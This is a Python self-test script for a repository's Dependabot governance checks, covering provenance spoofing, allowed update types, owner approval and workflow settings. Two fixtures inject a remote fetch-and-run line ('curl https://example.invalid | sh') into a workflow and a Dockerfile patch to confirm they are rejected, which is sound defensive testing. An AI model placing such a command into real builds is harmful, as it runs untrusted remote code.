#!/usr/bin/env python3
from __future__ import annotations

import json
from copy import deepcopy
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import dependency_governance as gov
from dependency_governance_lib.models import Assessment, GovernanceError
from dependency_governance_lib.qualification import validate_qualification
from dependency_governance_lib.reconcile import (
    ensure_owner_review_and_approval,
    has_exact_owner_approval,
    request_dependabot_refresh,
)

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads((ROOT / '.github/dependency-governance.json').read_text(encoding='utf-8'))
WORKFLOW = (ROOT / '.github/workflows/dependency-governance.yml').read_text(encoding='utf-8')
BASE = '1' * 40
HEAD = '2' * 40
OLD = '3' * 40
NEW = '4' * 40
NOW = datetime(2026, 9, 1, 20, tzinfo=timezone.utc)
REPO = 'portyu9/k6-performance-testing-framework'


def meta(name: str, version: str, update: str) -> str:
    return (
        'updated-dependencies:\n'
        f'- dependency-name: {name}\n'
        f'  dependency-version: {version}\n'
        '  dependency-type: direct:production\n'
        f'  update-type: {update}\n...\n'
    )


def commit(extra: str = '') -> dict[str, Any]:
    return {
        'sha': HEAD,
        'parents': [{'sha': BASE}],
        'author': {'login': 'dependabot[bot]', 'id': 49699333},
        'committer': {'login': 'web-flow'},
        'commit': {
            'author': {'name': 'dependabot[bot]', 'email': '49699333+dependabot[bot]@users.noreply.github.com'},
            'committer': {'name': 'GitHub', 'email': 'noreply@github.com'},
            'message': 'Dependabot update\n\n---\n' + extra + 'Signed-off-by: dependabot[bot] <support@github.com>',
            'verification': {'verified': True, 'reason': 'valid', 'signature': 'sig', 'payload': 'payload'},
        },
    }


def pull() -> dict[str, Any]:
    return {
        'number': 17, 'state': 'open', 'draft': False, 'created_at': '2026-08-30T20:00:00Z', 'labels': [],
        'user': {'login': 'dependabot[bot]', 'id': 49699333},
        'base': {'ref': 'main', 'sha': BASE, 'repo': {'full_name': REPO}},
        'head': {'ref': 'dependabot/gomod/docker/security-overrides/security-overrides-abc', 'sha': HEAD, 'repo': {'full_name': REPO}},
    }


class FakeApi:
    repository = REPO
    def __init__(self, files: dict[tuple[str, str], str | None] | None = None, pulls: list[dict[str, Any]] | None = None):
        self.files = files or {}
        self.pulls = pulls or []
    def file_at(self, filename: str, ref: str, optional: bool = False) -> str | None:
        value = self.files.get((filename, ref))
        if value is None and not optional:
            raise gov.GovernanceError(f'missing fixture {filename}@{ref}')
        return value
    def paginate(self, path: str, selector: str | None = None) -> list[Any]:
        if path.startswith('/pulls?'):
            return self.pulls
        raise AssertionError(path)



class OwnerApi:
    def __init__(self, login: str = 'portyu9', user_id: int = 35150859):
        self.identity = {'login': login, 'id': user_id}
        self.comments: list[dict[str, Any]] = []
        self.reviews: list[dict[str, Any]] = []

    def get(self, path: str) -> dict[str, Any]:
        if path == 'https://api.github.com/user':
            return self.identity
        raise AssertionError(path)

    def paginate(self, path: str, selector: str | None = None) -> list[dict[str, Any]]:
        if path.endswith('/comments'):
            return self.comments
        if path.endswith('/reviews'):
            return self.reviews
        raise AssertionError(path)

    def post(self, path: str, payload: dict[str, Any]) -> dict[str, Any]:
        user = dict(self.identity)
        if path.endswith('/comments'):
            item = {'id': len(self.comments) + 1, 'body': payload['body'], 'user': user}
            self.comments.append(item)
            return item
        if path.endswith('/reviews'):
            item = {
                'id': len(self.reviews) + 1,
                'body': payload['body'],
                'user': user,
                'state': 'APPROVED',
                'commit_id': payload['commit_id'],
            }
            self.reviews.append(item)
            return item
        raise AssertionError(path)


def owner_assessment(*, head: str = HEAD, stale: bool = False) -> Assessment:
    return Assessment(
        pull={'number': 17},
        base_sha=BASE,
        head_sha=head,
        files=[],
        commits=[],
        ecosystem='github-actions',
        provenance={
            'eligible': not stale,
            'reasons': ['Dependabot commit parent is not the current main SHA'] if stale else [],
            'provenanceState': 'canonical-dependabot',
        },
        metadata=[],
        semantic={'eligible': not stale, 'reasons': [], 'changes': []},
        qualification={'eligible': not stale, 'reasons': [], 'runs': []},
    )


def action_patch(version: str = '7.0.1', extra: str = '') -> str:
    return (
        '@@ -1 +1 @@\n'
        f'-        uses: actions/checkout@{OLD} # v7.0.0\n'
        f'+        uses: actions/checkout@{NEW} # v{version}\n' + extra
    )


def docker_patch(
    image: str = 'golang',
    old_tag: str = '1.27.1-alpine3.24',
    new_tag: str = '1.27.1-alpine3.24',
    old_digest: str = 'a' * 64,
    new_digest: str = 'b' * 64,
    platform: str = '--platform=$BUILDPLATFORM ',
    alias: str = 'builder',
    extra: str = '',
) -> str:
    return (
        '@@ -1 +1 @@\n'
        f'-FROM {platform}{image}:{old_tag}@sha256:{old_digest} AS {alias}\n'
        f'+FROM {platform}{image}:{new_tag}@sha256:{new_digest} AS {alias}\n' + extra
    )


def go_model(
    x_crypto: str = '0.55.0',
    grpc: str = '1.83.0',
    indirect: str = '0.48.0',
) -> str:
    return (
        f'module github.com/{REPO}/docker/security-overrides\n\n'
        'go 1.26.0\n\n'
        'require (\n'
        f'\tgolang.org/x/crypto v{x_crypto}\n'
        f'\tgoogle.golang.org/grpc v{grpc}\n'
        ')\n\n'
        f'require golang.org/x/sys v{indirect} // indirect\n'
    )


def go_metadata(*items: tuple[str, str, str]) -> list[dict[str, str]]:
    return [
        {'name': name, 'version': version, 'dependencyType': 'direct:production', 'updateType': update}
        for name, version, update in items
    ]


def check_config() -> None:
    assert gov.validate_config(CONFIG) == []
    broken = deepcopy(CONFIG); broken['allowedGoOverrideUpdateTypes'].append('version-update:semver-major')
    assert any('major' in reason for reason in gov.validate_config(broken))
    broken = deepcopy(CONFIG); broken['ecosystems']['gomod-security-override']['dependencies'].append('golang.org/x/crypto')
    assert any('unique' in reason for reason in gov.validate_config(broken))
    broken = deepcopy(CONFIG); broken['ecosystems']['docker']['mode'] = 'manual'
    assert any('qualified autonomous' in reason for reason in gov.validate_config(broken))
    broken = deepcopy(CONFIG); broken['ownerApprovalRequired'] = False
    assert any('ownerApprovalRequired' in reason for reason in gov.validate_config(broken))
    broken = deepcopy(CONFIG); broken['ownerApprovalUserId'] = 0
    assert any('ownerApprovalUserId' in reason for reason in gov.validate_config(broken))

def check_parsers() -> None:
    assert gov.parse_positive_integer('42', 'pr') == 42 and gov.parse_bool('true') and not gov.parse_bool('false')
    for bad in ('0', '-1', '1.0', '9007199254740992'):
        try: gov.parse_positive_integer(bad, 'pr')
        except gov.GovernanceError: pass
        else: raise AssertionError(bad)


def check_metadata() -> None:
    parsed = gov.parse_dependabot_metadata(meta('golang.org/x/crypto', '0.55.1', 'version-update:semver-patch'))
    assert parsed == [{'name': 'golang.org/x/crypto', 'version': '0.55.1', 'dependencyType': 'direct:production', 'updateType': 'version-update:semver-patch'}]


def check_classification() -> None:
    assert gov.classify_ecosystem([{'filename':'docker/Dockerfile'}], CONFIG) == 'docker'
    assert gov.classify_ecosystem([{'filename':'docker/security-overrides/go.mod'}], CONFIG) == 'gomod-security-override'
    assert gov.classify_ecosystem([{'filename':'.github/workflows/ci.yml'}], CONFIG) == 'github-actions'
    assert gov.classify_ecosystem([{'filename':'README.md'}], CONFIG) == 'unknown'


def check_provenance() -> None:
    c = commit(meta('golang.org/x/crypto','0.55.1','version-update:semver-patch'))
    assert gov.validate_provenance(pull(), [c], BASE, CONFIG, REPO, now=NOW)['eligible']


def check_spoofing() -> None:
    c = commit(meta('golang.org/x/crypto','0.55.1','version-update:semver-patch'))
    cases=[]
    p=pull(); p['user']['id']=1; cases.append((p,[c]))
    x=deepcopy(c); x['commit']['verification']['verified']=False; cases.append((pull(),[x]))
    x=deepcopy(c); x['committer']={'login':'human'}; cases.append((pull(),[x]))
    x=deepcopy(c); x['parents']=[{'sha':'9'*40}]; cases.append((pull(),[x]))
    p=pull(); p['labels']=[{'name':'manual-review'}]; cases.append((p,[c]))
    for p, commits in cases:
        assert not gov.validate_provenance(p, commits, BASE, CONFIG, REPO, now=NOW)['eligible']


def check_go_patch() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='0.55.1')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert result['eligible'], result['reasons']


def check_grpc_security_patch() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(grpc='1.83.1')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('google.golang.org/grpc','1.83.1','security-update:semver-patch')),CONFIG)
    assert result['eligible'], result['reasons']
    assert result['changes'] == [{'dependency':'google.golang.org/grpc','from':'v1.83.0','to':'v1.83.1'}]


def check_go_refusal() -> None:
    path='docker/security-overrides/go.mod'
    api=FakeApi({(path,BASE):go_model(), (path,HEAD):go_model(x_crypto='1.0.0')})
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','1.0.0','version-update:semver-major')),CONFIG)
    assert not result['eligible']
    api.files[(path,HEAD)] = go_model(x_crypto='0.56.0')
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.56.0','version-update:semver-minor')),CONFIG)
    assert result['eligible'], result['reasons']
    api.files[(path,HEAD)] = go_model(x_crypto='0.55.1') + 'replace example.invalid/a => example.invalid/b v1.0.0\n'
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert not result['eligible']
    api.files[(path,HEAD)] = go_model(grpc='1.83.1')
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert not result['eligible']
    api.files[(path,HEAD)] = go_model(x_crypto='0.55.1', indirect='0.49.0')
    result=gov.validate_go_override(
        api,BASE,HEAD,[{'filename':path}],
        go_metadata(('golang.org/x/crypto','0.55.1','version-update:semver-patch')),CONFIG)
    assert not result['eligible']
    assert any('indirect Go module metadata' in reason for reason in result['reasons'])

def check_owner_identity_review_and_refresh() -> None:
    good = OwnerApi(CONFIG['ownerApprovalLogin'], CONFIG['ownerApprovalUserId'])
    assessment = owner_assessment()
    ensure_owner_review_and_approval(good, assessment, CONFIG)
    assert len(good.comments) == 1
    assert len(good.reviews) == 1
    assert has_exact_owner_approval(good, 17, HEAD, CONFIG)

    # Reconciliation is idempotent for the same exact head.
    ensure_owner_review_and_approval(good, assessment, CONFIG)
    assert len(good.comments) == 1
    assert len(good.reviews) == 1

    # A stale owner approval cannot satisfy the current exact head.
    stale_review = OwnerApi(CONFIG['ownerApprovalLogin'], CONFIG['ownerApprovalUserId'])
    stale_review.reviews.append({
        'state': 'APPROVED',
        'commit_id': OLD,
        'user': {'login': CONFIG['ownerApprovalLogin'], 'id': CONFIG['ownerApprovalUserId']},
        'body': 'old approval',
    })
    ensure_owner_review_and_approval(stale_review, assessment, CONFIG)
    assert len(stale_review.reviews) == 2
    assert has_exact_owner_approval(stale_review, 17, HEAD, CONFIG)

    # Wrong or absent identities fail closed.
    for owner in (None, OwnerApi('github-actions[bot]', 41898282)):
        try:
            ensure_owner_review_and_approval(owner, assessment, CONFIG)
        except GovernanceError:
            pass
        else:
            raise AssertionError('untrusted owner identity was accepted')

    # A bot-authored legacy marker must not suppress the push-capable owner command.
    refresh_api = OwnerApi(CONFIG['ownerApprovalLogin'], CONFIG['ownerApprovalUserId'])
    refresh_api.comments.append({
        'id': 1,
        'body': f'@dependabot rebase\n<!-- dependency-owner-refresh:v2:{HEAD}:rebase -->',
        'user': {'login': 'github-actions[bot]', 'id': 41898282},
    })
    command = request_dependabot_refresh(refresh_api, 17, owner_assessment(stale=True), CONFIG)
    assert command == 'rebase'
    assert len(refresh_api.comments) == 2
    assert refresh_api.comments[-1]['user']['login'] == CONFIG['ownerApprovalLogin']
    assert '@dependabot rebase' in refresh_api.comments[-1]['body']


def check_action_patch() -> None:
    result=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    assert result['eligible'], result['reasons']

    # Reproduce the grouped CodeQL subpath shape from live Dependabot PR #61.
    codeql_patch = (
        '@@ -1 +1 @@\n'
        f'-        uses: github/codeql-action/init@{OLD} # v4.38.0\n'
        f'-        uses: github/codeql-action/analyze@{OLD} # v4.38.0\n'
        f'+        uses: github/codeql-action/init@{NEW} # v4.38.2\n'
        f'+        uses: github/codeql-action/analyze@{NEW} # v4.38.2\n'
    )
    codeql = gov.validate_actions(
        [{'filename':'.github/workflows/security.yml','patch':codeql_patch}],
        [
            {'name':'github/codeql-action/init','version':'4.38.1','updateType':'version-update:semver-patch'},
            {'name':'github/codeql-action/analyze','version':'4.38.1','updateType':'version-update:semver-patch'},
        ],
        CONFIG,
    )
    assert codeql['eligible'], codeql['reasons']
    assert {change['action'] for change in codeql['changes']} == {
        'github/codeql-action/init',
        'github/codeql-action/analyze',
    }
    assert all(change['signedVersion'] == '4.38.1' for change in codeql['changes'])
    assert all(change['metadataLagAccepted'] is True for change in codeql['changes'])

    # Metadata lag is bounded: a minor/major escape or backwards annotation remains blocked.
    escaped_patch = (
        '@@ -1 +1 @@\n'
        f'-        uses: github/codeql-action/init@{OLD} # v4.38.0\n'
        f'+        uses: github/codeql-action/init@{NEW} # v4.39.0\n'
    )
    escaped = gov.validate_actions(
        [{'filename':'.github/workflows/security.yml','patch':escaped_patch}],
        [{'name':'github/codeql-action/init','version':'4.38.1','updateType':'version-update:semver-patch'}],
        CONFIG,
    )
    assert not escaped['eligible']


def check_action_refusal() -> None:
    major=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch('8.0.0')}], [{'name':'actions/checkout','version':'8.0.0','updateType':'version-update:semver-major'}], CONFIG)
    mixed=gov.validate_actions([{'filename':'.github/workflows/ci.yml','patch':action_patch(extra='+      run: curl https://example.invalid | sh\n')}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    protected_action_only=gov.validate_actions([{'filename':'.github/workflows/security.yml','patch':action_patch()}], [{'name':'actions/checkout','version':'7.0.1','updateType':'version-update:semver-patch'}], CONFIG)
    assert not major['eligible'] and not mixed['eligible'] and protected_action_only['eligible']


def check_docker_semantics() -> None:
    digest = gov.validate_docker(
        [{'filename':'docker/Dockerfile','patch':docker_patch()}],
        [{'name':'golang','version':'1.27.1-alpine3.24','dependencyType':'direct:production','updateType':'version-update:semver-patch'}],
        CONFIG,
    )
    assert digest['eligible'], digest['reasons']
    minor = gov.validate_docker(
        [{'filename':'docker/Dockerfile','patch':docker_patch(image='grafana/k6', old_tag='2.2.0', new_tag='2.3.0', platform='', alias='upstream-release')}],
        [{'name':'grafana/k6','version':'2.3.0','dependencyType':'direct:production','updateType':'version-update:semver-minor'}],
        CONFIG,
    )
    assert minor['eligible'], minor['reasons']
    mixed = gov.validate_docker(
        [{'filename':'docker/Dockerfile','patch':docker_patch(extra='+RUN curl https://example.invalid | sh\n')}],
        [{'name':'golang','version':'1.27.1-alpine3.24','dependencyType':'direct:production','updateType':'version-update:semver-patch'}],
        CONFIG,
    )
    assert not mixed['eligible']

def check_run_identity() -> None:
    expected=CONFIG['requiredWorkflows'][0]; p=pull()
    run={'name':'ci','path':'.github/workflows/ci.yml','event':'pull_request','head_sha':HEAD,'head_branch':p['head']['ref'],'status':'completed','conclusion':'success','pull_requests':[{'number':17,'base':{'sha':BASE}}]}
    assert gov.validate_run_identity(run, expected, p, BASE) == []
    for field,value in [('name','wrong'),('path','.github/workflows/other.yml'),('event','push'),('head_sha','9'*40),('head_branch','dependabot/wrong'),('conclusion','failure')]:
        bad=deepcopy(run); bad[field]=value; assert gov.validate_run_identity(bad, expected, p, BASE)


def check_qualification() -> None:
    p = pull(); expected = CONFIG['requiredWorkflows']
    class Api:
        def paginate(self, path: str, selector: str | None = None):
            if path.startswith('/actions/runs?'):
                return [
                    {'id': i + 1, 'name': item['workflow'], 'path': f".github/workflows/{item['file']}",
                     'event': 'pull_request', 'head_sha': HEAD, 'head_branch': p['head']['ref'],
                     'status': 'completed', 'conclusion': 'success',
                     'pull_requests': [{'number': 17, 'base': {'sha': BASE}}]}
                    for i, item in enumerate(expected)
                ]
            if path.startswith('/actions/runs/') and path.endswith('/jobs'):
                run_id = int(path.split('/')[3]); item = expected[run_id - 1]
                return [{'name': item['gate'], 'status': 'completed', 'conclusion': 'success'}]
            raise AssertionError(path)
    result = validate_qualification(Api(), p, BASE, CONFIG)
    assert result['eligible'], result['reasons']


def check_targets() -> None:
    api=FakeApi(pulls=[{'number':1,'user':{'login':'dependabot[bot]'}},{'number':2,'user':{'login':'human'}},{'number':3,'user':{'login':'dependabot[bot]'}}])
    assert gov.target_pull_requests(api,'schedule',{},CONFIG) == [1,3]
    assert gov.target_pull_requests(api,'workflow_dispatch',{'inputs':{'pr-number':'7'}},CONFIG) == [7]
    try: gov.target_pull_requests(api,'workflow_dispatch',{'inputs':{'pr-number':'7x'}},CONFIG)
    except gov.GovernanceError: pass
    else: raise AssertionError('unsafe dispatch input accepted')


def check_workflow_boundary() -> None:
    assert 'ref: ${{ github.event.repository.default_branch }}' in WORKFLOW
    assert 'persist-credentials: false' in WORKFLOW
    assert "github.event_name == 'pull_request' && 'self-test' || 'reconcile'" in WORKFLOW
    assert "if: github.event_name != 'pull_request'" in WORKFLOW
    assert 'pull_request_target:' in WORKFLOW and 'workflow_run:' in WORKFLOW
    assert "- '.github/scripts/dependency_governance_lib/**'" in WORKFLOW
    assert "- '.github/scripts/dependency_repair.py'" in WORKFLOW
    assert "cron: '17 * * * *'" in WORKFLOW
    assert 'Apply deterministic dependency repair' in WORKFLOW
    owner_secret = 'DEPENDABOT_OWNER_TOKEN: ${{ secrets.DEPENDABOT_OWNER_TOKEN }}'
    assert WORKFLOW.count(owner_secret) == 1
    assert WORKFLOW.index(owner_secret) > WORKFLOW.index('Reconcile dependency governance')
    assert "group: dependency-governance-${{ github.event_name == 'pull_request' && github.event.pull_request.head.ref || 'reconcile' }}" in WORKFLOW


CHECKS=[
    check_config,check_parsers,check_metadata,check_classification,check_provenance,
    check_spoofing,check_go_patch,check_grpc_security_patch,check_go_refusal,
    check_owner_identity_review_and_refresh,check_action_patch,check_action_refusal,check_docker_semantics,check_run_identity,check_qualification,
    check_targets,check_workflow_boundary,
]
if __name__ == '__main__':
    for check in CHECKS: check()
    print(f'dependency governance self-check: {len(CHECKS)} checks passed')
